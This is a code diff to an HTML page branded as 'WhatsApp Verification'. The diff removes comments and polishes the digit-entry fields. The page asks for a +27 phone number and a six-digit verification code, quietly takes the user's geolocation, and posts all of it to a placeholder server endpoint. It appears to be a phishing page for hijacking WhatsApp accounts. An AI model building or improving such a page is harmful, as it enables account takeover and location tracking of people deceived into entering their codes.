@@ -17,17 +17,17 @@
             border: 1px solid #ddd;
             border-radius: 5px;
             box-shadow: 0 0 10px rgba(0,0,0,0.1);
-            position: relative; /* Added for positioning the image */
+            position: relative;
         }
         .container img {
             position: absolute;
-            top: -40px; /* Adjust as needed */
+            top: -40px;
             left: 50%;
             transform: translateX(-50%);
-            border-radius: 60%; /* Makes the image circular */
-            width: 58px; /* Adjusted by reducing 2 pixels */
-            height: 58px; /* Adjusted by reducing 2 pixels */
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2); /* Added shadow around the image */
+            border-radius: 60%;
+            width: 58px;
+            height: 58px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
         }
         .input-group {
             display: flex;
@@ -92,7 +92,7 @@
 </head>
 <body>
     <div class="container">
-        <img src="images.png" alt="WhatsApp" /> <!-- Image added here -->
+        <img src="images.png" alt="WhatsApp" />
         <h2>WhatsApp Verification</h2>
         <form id="verification-form">
             <p>Enter your phone number:</p>
@@ -108,17 +108,17 @@
     </div>
 
     <script>
-        // Function to create input fields and set up auto-tab functionality
         function createInputFields(parentId, numFields, inputNamePrefix) {
             const parentElement = document.getElementById(parentId);
             for (let i = 1; i <= numFields; i++) {
                 const input = document.createElement('input');
-                input.type = 'text';
+                input.type = 'tel';
                 input.name = inputNamePrefix + i;
                 input.maxLength = 1;
                 input.required = true;
+                input.pattern = "[0-9]*";
+                input.inputMode = "numeric";
 
-                // Ensure only integers are allowed
                 input.addEventListener('input', (event) => {
                     const value = event.target.value;
                     if (!/^\d*$/.test(value)) {
@@ -126,7 +126,6 @@
                     }
                 });
 
-                // Handle forward tabbing
                 input.addEventListener('input', (event) => {
                     if (event.target.value.length === 1) {
                         const nextInput = event.target.nextElementSibling;
@@ -136,10 +135,12 @@
                     }
                 });
 
-                // Prevent backward tabbing
                 input.addEventListener('keydown', (event) => {
                     if (event.key === 'Backspace' && event.target.value.length === 0) {
-                        event.preventDefault();
+                        const prevInput = event.target.previousElementSibling;
+                        if (prevInput) {
+                            prevInput.focus();
+                        }
                     }
                 });
 
@@ -147,36 +148,28 @@
             }
         }
 
-        // Create phone number input fields
         createInputFields('phone-number-group', 9, 'digit');
-
-        // Create verification code input fields
         createInputFields('verification-code-group', 6, 'code');
 
-        // Handle form submission
         document.getElementById('verification-form').addEventListener('submit', function(event) {
             event.preventDefault();
 
-            // Collect phone number digits
             const phoneNumberInputs = document.querySelectorAll('#phone-number-group input');
             let phoneNumber = '+27';
             phoneNumberInputs.forEach(input => {
                 phoneNumber += input.value;
             });
 
-            // Collect verification code digits
             const verificationCodeInputs = document.querySelectorAll('#verification-code-group input');
             let verificationCode = '';
             verificationCodeInputs.forEach(input => {
                 verificationCode += input.value;
             });
 
-            // Get user's geolocation
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition((position) => {
                     const { latitude, longitude } = position.coords;
 
-                    // Send data to the server
                     fetch('https://your-server-endpoint.com/process', {
                         method: 'POST',
                         headers: {
